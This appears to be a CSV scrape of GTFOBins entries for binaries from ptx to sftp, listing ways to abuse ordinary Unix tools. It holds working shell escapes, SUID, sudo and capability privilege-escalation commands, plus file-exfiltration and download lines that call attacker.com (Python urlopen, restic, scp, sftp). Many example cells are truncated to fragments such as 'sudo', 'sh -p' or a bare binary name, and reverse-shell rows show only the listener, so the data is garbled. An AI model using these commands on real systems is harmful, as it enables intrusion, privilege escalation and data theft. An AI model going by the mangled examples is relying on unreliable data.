ptx,SUID,https://gtfobins.github.io/gtfobins/ptx/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ptx,Sudo,https://gtfobins.github.io/gtfobins/ptx/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
puppet,Shell,https://gtfobins.github.io/gtfobins/puppet/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"puppet apply -e ""exec { '/bin/sh -c \""exec sh -i <$(tty) >$(tty) 2>$(tty)\""': }"""
puppet,File write,https://gtfobins.github.io/gtfobins/puppet/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=""/tmp/file_to_write""
puppet apply -e ""file { '$LFILE': content => 'DATA' }"""
puppet,File read,https://gtfobins.github.io/gtfobins/puppet/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",diff
puppet,Sudo,https://gtfobins.github.io/gtfobins/puppet/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
pwsh,Shell,https://gtfobins.github.io/gtfobins/pwsh/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,pwsh
pwsh,File write,https://gtfobins.github.io/gtfobins/pwsh/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","export LFILE=file_to_write
pwsh -c '""DATA"" | Out-File $env:LFILE'"
pwsh,Sudo,https://gtfobins.github.io/gtfobins/pwsh/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
python,Shell,https://gtfobins.github.io/gtfobins/python/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"python -c 'import os; os.system(""/bin/sh"")'"
python,Reverse shell,https://gtfobins.github.io/gtfobins/python/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,"socat file:`tty`,raw,echo=0 tcp-listen:12345"
python,File upload,https://gtfobins.github.io/gtfobins/python/#file-upload,It can exfiltrate files on the network.,"export URL=http://attacker.com/
export LFILE=file_to_send
python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))'"
python,File download,https://gtfobins.github.io/gtfobins/python/#file-download,It can download remote files.,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])'"
python,File write,https://gtfobins.github.io/gtfobins/python/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","python -c 'open(""file_to_write"",""w+"").write(""DATA"")'"
python,File read,https://gtfobins.github.io/gtfobins/python/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","python -c 'print(open(""file_to_read"").read())'"
python,Library load,https://gtfobins.github.io/gtfobins/python/#library-load,It loads shared libraries that may be used to run code in the binary execution context.,"python -c 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")'"
python,SUID,https://gtfobins.github.io/gtfobins/python/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
python,Sudo,https://gtfobins.github.io/gtfobins/python/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
python,Capabilities,https://gtfobins.github.io/gtfobins/python/#capabilities,"If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.",CAP_SETUID
rake,Shell,https://gtfobins.github.io/gtfobins/rake/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,rake -p '`/bin/sh 1>&0`'
rake,File read,https://gtfobins.github.io/gtfobins/rake/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file-to-read
rake -f $LFILE"
rake,Sudo,https://gtfobins.github.io/gtfobins/rake/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
rake,Limited SUID,https://gtfobins.github.io/gtfobins/rake/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
rc,Shell,https://gtfobins.github.io/gtfobins/rc/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,rc -c '/bin/sh'
rc,SUID,https://gtfobins.github.io/gtfobins/rc/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
rc,Sudo,https://gtfobins.github.io/gtfobins/rc/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
readelf,File read,https://gtfobins.github.io/gtfobins/readelf/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
readelf -a @$LFILE"
readelf,SUID,https://gtfobins.github.io/gtfobins/readelf/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
readelf,Sudo,https://gtfobins.github.io/gtfobins/readelf/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
red,File write,https://gtfobins.github.io/gtfobins/red/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","red file_to_write
a
DATA
.
w
q"
red,File read,https://gtfobins.github.io/gtfobins/red/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","red file_to_read
,p
q"
red,Sudo,https://gtfobins.github.io/gtfobins/red/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
redcarpet,File read,https://gtfobins.github.io/gtfobins/redcarpet/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
redcarpet ""$LFILE"""
redcarpet,Sudo,https://gtfobins.github.io/gtfobins/redcarpet/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
redis,File write,https://gtfobins.github.io/gtfobins/redis/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","IP=127.0.0.1
redis-cli -h $IP
config set dir dir_to_write_to
config set dbfilename file_to_write
set x ""DATA""
save"
restic,File upload,https://gtfobins.github.io/gtfobins/restic/#file-upload,It can exfiltrate files on the network.,"RHOST=attacker.com
RPORT=12345
LFILE=file_or_dir_to_get
NAME=backup_name
restic backup -r ""rest:http://$RHOST:$RPORT/$NAME"" ""$LFILE"""
restic,SUID,https://gtfobins.github.io/gtfobins/restic/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
restic,Sudo,https://gtfobins.github.io/gtfobins/restic/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
rev,File read,https://gtfobins.github.io/gtfobins/rev/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
rev $LFILE | rev"
rev,SUID,https://gtfobins.github.io/gtfobins/rev/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
rev,Sudo,https://gtfobins.github.io/gtfobins/rev/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
rlogin,File upload,https://gtfobins.github.io/gtfobins/rlogin/#file-upload,It can exfiltrate files on the network.,"nc -l -p 12345 > ""file_to_save"""
rlwrap,Shell,https://gtfobins.github.io/gtfobins/rlwrap/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,rlwrap /bin/sh
rlwrap,File write,https://gtfobins.github.io/gtfobins/rlwrap/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",echo
rlwrap,SUID,https://gtfobins.github.io/gtfobins/rlwrap/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
rlwrap,Sudo,https://gtfobins.github.io/gtfobins/rlwrap/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
rpm,Shell,https://gtfobins.github.io/gtfobins/rpm/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"rpm --eval '%{lua:os.execute(""/bin/sh"")}'"
rpm,Sudo,https://gtfobins.github.io/gtfobins/rpm/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
rpm,Limited SUID,https://gtfobins.github.io/gtfobins/rpm/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
rpmdb,Shell,https://gtfobins.github.io/gtfobins/rpmdb/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,rpmdb --eval '%(/bin/sh 1>&2)'
rpmdb,Sudo,https://gtfobins.github.io/gtfobins/rpmdb/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
rpmdb,Limited SUID,https://gtfobins.github.io/gtfobins/rpmdb/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
rpmquery,Shell,https://gtfobins.github.io/gtfobins/rpmquery/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"rpmquery --eval '%{lua:posix.exec(""/bin/sh"")}'"
rpmquery,Sudo,https://gtfobins.github.io/gtfobins/rpmquery/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
rpmquery,Limited SUID,https://gtfobins.github.io/gtfobins/rpmquery/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
rpmverify,Shell,https://gtfobins.github.io/gtfobins/rpmverify/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,rpmverify --eval '%(/bin/sh 1>&2)'
rpmverify,Sudo,https://gtfobins.github.io/gtfobins/rpmverify/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
rpmverify,Limited SUID,https://gtfobins.github.io/gtfobins/rpmverify/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
rsync,Shell,https://gtfobins.github.io/gtfobins/rsync/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"rsync -e 'sh -c ""sh 0<&2 1>&2""' 127.0.0.1:/dev/null"
rsync,SUID,https://gtfobins.github.io/gtfobins/rsync/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
rsync,Sudo,https://gtfobins.github.io/gtfobins/rsync/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
rtorrent,Shell,https://gtfobins.github.io/gtfobins/rtorrent/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"echo ""execute = /bin/sh,-c,\""/bin/sh <$(tty) >$(tty) 2>$(tty)\"""" >~/.rtorrent.rc
rtorrent"
rtorrent,SUID,https://gtfobins.github.io/gtfobins/rtorrent/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
ruby,Shell,https://gtfobins.github.io/gtfobins/ruby/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"ruby -e 'exec ""/bin/sh""'"
ruby,Reverse shell,https://gtfobins.github.io/gtfobins/ruby/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
ruby,File upload,https://gtfobins.github.io/gtfobins/ruby/#file-upload,It can exfiltrate files on the network.,"export LPORT=8888
ruby -run -e httpd . -p $LPORT"
ruby,File download,https://gtfobins.github.io/gtfobins/ruby/#file-download,It can download remote files.,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
ruby -e 'require ""open-uri""; download = open(ENV[""URL""]); IO.copy_stream(download, ENV[""LFILE""])'"
ruby,File write,https://gtfobins.github.io/gtfobins/ruby/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","ruby -e 'File.open(""file_to_write"", ""w+"") { |f| f.write(""DATA"") }'"
ruby,File read,https://gtfobins.github.io/gtfobins/ruby/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","ruby -e 'puts File.read(""file_to_read"")'"
ruby,Library load,https://gtfobins.github.io/gtfobins/ruby/#library-load,It loads shared libraries that may be used to run code in the binary execution context.,"ruby -e 'require ""fiddle""; Fiddle.dlopen(""lib.so"")'"
ruby,Sudo,https://gtfobins.github.io/gtfobins/ruby/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
ruby,Capabilities,https://gtfobins.github.io/gtfobins/ruby/#capabilities,"If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.",CAP_SETUID
run-mailcap,Shell,https://gtfobins.github.io/gtfobins/run-mailcap/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,less
run-mailcap,File write,https://gtfobins.github.io/gtfobins/run-mailcap/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",vi
run-mailcap,File read,https://gtfobins.github.io/gtfobins/run-mailcap/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",less
run-mailcap,Sudo,https://gtfobins.github.io/gtfobins/run-mailcap/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
run-parts,Shell,https://gtfobins.github.io/gtfobins/run-parts/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,run-parts --new-session --regex '^sh$' /bin
run-parts,SUID,https://gtfobins.github.io/gtfobins/run-parts/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
run-parts,Sudo,https://gtfobins.github.io/gtfobins/run-parts/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
runscript,Shell,https://gtfobins.github.io/gtfobins/runscript/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp)
echo '! exec /bin/sh' >$TF
runscript $TF"
runscript,Sudo,https://gtfobins.github.io/gtfobins/runscript/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
runscript,Limited SUID,https://gtfobins.github.io/gtfobins/runscript/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
rview,Shell,https://gtfobins.github.io/gtfobins/rview/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,rview
rview,Reverse shell,https://gtfobins.github.io/gtfobins/rview/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,rview
rview,Non-interactive reverse shell,https://gtfobins.github.io/gtfobins/rview/#non-interactive-reverse-shell,It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
rview,Non-interactive bind shell,https://gtfobins.github.io/gtfobins/rview/#non-interactive-bind-shell,It can bind a non-interactive shell to a local port to allow remote network access.,nc target.com 12345
rview,File upload,https://gtfobins.github.io/gtfobins/rview/#file-upload,It can exfiltrate files on the network.,rview
rview,File download,https://gtfobins.github.io/gtfobins/rview/#file-download,It can download remote files.,rview
rview,File write,https://gtfobins.github.io/gtfobins/rview/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","rview file_to_write
iDATA
^[
w!"
rview,File read,https://gtfobins.github.io/gtfobins/rview/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",rview file_to_read
rview,Library load,https://gtfobins.github.io/gtfobins/rview/#library-load,It loads shared libraries that may be used to run code in the binary execution context.,rview
rview,SUID,https://gtfobins.github.io/gtfobins/rview/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
rview,Sudo,https://gtfobins.github.io/gtfobins/rview/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
rview,Capabilities,https://gtfobins.github.io/gtfobins/rview/#capabilities,"If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.",CAP_SETUID
rview,Limited SUID,https://gtfobins.github.io/gtfobins/rview/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
rvim,Shell,https://gtfobins.github.io/gtfobins/rvim/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,rvim
rvim,Reverse shell,https://gtfobins.github.io/gtfobins/rvim/#reverse-shell,It can send back a reverse shell to a listening attacker to open a remote network access.,rvim
rvim,Non-interactive reverse shell,https://gtfobins.github.io/gtfobins/rvim/#non-interactive-reverse-shell,It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.,nc -l -p 12345
rvim,Non-interactive bind shell,https://gtfobins.github.io/gtfobins/rvim/#non-interactive-bind-shell,It can bind a non-interactive shell to a local port to allow remote network access.,nc target.com 12345
rvim,File upload,https://gtfobins.github.io/gtfobins/rvim/#file-upload,It can exfiltrate files on the network.,rvim
rvim,File download,https://gtfobins.github.io/gtfobins/rvim/#file-download,It can download remote files.,rvim
rvim,File write,https://gtfobins.github.io/gtfobins/rvim/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","rvim file_to_write
iDATA
^[
w"
rvim,File read,https://gtfobins.github.io/gtfobins/rvim/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",rvim file_to_read
rvim,Library load,https://gtfobins.github.io/gtfobins/rvim/#library-load,It loads shared libraries that may be used to run code in the binary execution context.,rvim
rvim,SUID,https://gtfobins.github.io/gtfobins/rvim/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
rvim,Sudo,https://gtfobins.github.io/gtfobins/rvim/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
rvim,Capabilities,https://gtfobins.github.io/gtfobins/rvim/#capabilities,"If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.",CAP_SETUID
rvim,Limited SUID,https://gtfobins.github.io/gtfobins/rvim/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
sash,Shell,https://gtfobins.github.io/gtfobins/sash/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,sash
sash,SUID,https://gtfobins.github.io/gtfobins/sash/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
sash,Sudo,https://gtfobins.github.io/gtfobins/sash/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
scanmem,Shell,https://gtfobins.github.io/gtfobins/scanmem/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"scanmem
shell /bin/sh"
scanmem,SUID,https://gtfobins.github.io/gtfobins/scanmem/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
scanmem,Sudo,https://gtfobins.github.io/gtfobins/scanmem/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
scp,Shell,https://gtfobins.github.io/gtfobins/scp/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF
chmod +x ""$TF""
scp -S $TF x y:"
scp,File upload,https://gtfobins.github.io/gtfobins/scp/#file-upload,It can exfiltrate files on the network.,"RPATH=user@attacker.com:~/file_to_save
LPATH=file_to_send
scp $LFILE $RPATH"
scp,File download,https://gtfobins.github.io/gtfobins/scp/#file-download,It can download remote files.,"RPATH=user@attacker.com:~/file_to_get
LFILE=file_to_save
scp $RPATH $LFILE"
scp,Sudo,https://gtfobins.github.io/gtfobins/scp/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
scp,Limited SUID,https://gtfobins.github.io/gtfobins/scp/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
screen,Shell,https://gtfobins.github.io/gtfobins/screen/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,screen
screen,File write,https://gtfobins.github.io/gtfobins/screen/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",\n
screen,Sudo,https://gtfobins.github.io/gtfobins/screen/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
script,Shell,https://gtfobins.github.io/gtfobins/script/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,script -q /dev/null
script,File write,https://gtfobins.github.io/gtfobins/script/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",script -q -c 'echo DATA' file_to_write
script,Sudo,https://gtfobins.github.io/gtfobins/script/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
scrot,Shell,https://gtfobins.github.io/gtfobins/scrot/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,scrot -e /bin/sh
scrot,Sudo,https://gtfobins.github.io/gtfobins/scrot/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
scrot,Limited SUID,https://gtfobins.github.io/gtfobins/scrot/#limited-suid,"If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",system()
sed,Shell,https://gtfobins.github.io/gtfobins/sed/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,bash
sed,Command,https://gtfobins.github.io/gtfobins/sed/#command,It can be used to break out from restricted environments by running non-interactive system commands.,sed -n '1e id' /etc/hosts
sed,File write,https://gtfobins.github.io/gtfobins/sed/#file-write,"It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.","LFILE=file_to_write
sed -n ""1s/.*/DATA/w $LFILE"" /etc/hosts"
sed,File read,https://gtfobins.github.io/gtfobins/sed/#file-read,"It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.","LFILE=file_to_read
sed '' ""$LFILE"""
sed,SUID,https://gtfobins.github.io/gtfobins/sed/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
sed,Sudo,https://gtfobins.github.io/gtfobins/sed/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
service,Shell,https://gtfobins.github.io/gtfobins/service/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,/usr/sbin/service ../../bin/sh
service,Sudo,https://gtfobins.github.io/gtfobins/service/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
setarch,Shell,https://gtfobins.github.io/gtfobins/setarch/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,setarch $(arch) /bin/sh
setarch,SUID,https://gtfobins.github.io/gtfobins/setarch/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
setarch,Sudo,https://gtfobins.github.io/gtfobins/setarch/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
setfacl,SUID,https://gtfobins.github.io/gtfobins/setfacl/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
setfacl,Sudo,https://gtfobins.github.io/gtfobins/setfacl/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
setlock,Shell,https://gtfobins.github.io/gtfobins/setlock/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"TF=$(mktemp)
setlock $TF /bin/sh"
setlock,SUID,https://gtfobins.github.io/gtfobins/setlock/#suid,"If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.",sh -p
setlock,Sudo,https://gtfobins.github.io/gtfobins/setlock/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
sftp,Shell,https://gtfobins.github.io/gtfobins/sftp/#shell,It can be used to break out from restricted environments by spawning an interactive system shell.,"HOST=user@attacker.com
sftp $HOST
!/bin/sh"
sftp,File upload,https://gtfobins.github.io/gtfobins/sftp/#file-upload,It can exfiltrate files on the network.,"RHOST=user@attacker.com
sftp $RHOST
put file_to_send file_to_save"
sftp,File download,https://gtfobins.github.io/gtfobins/sftp/#file-download,It can download remote files.,"RHOST=user@attacker.com
sftp $RHOST
get file_to_get file_to_save"
sftp,Sudo,https://gtfobins.github.io/gtfobins/sftp/#sudo,"If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",sudo
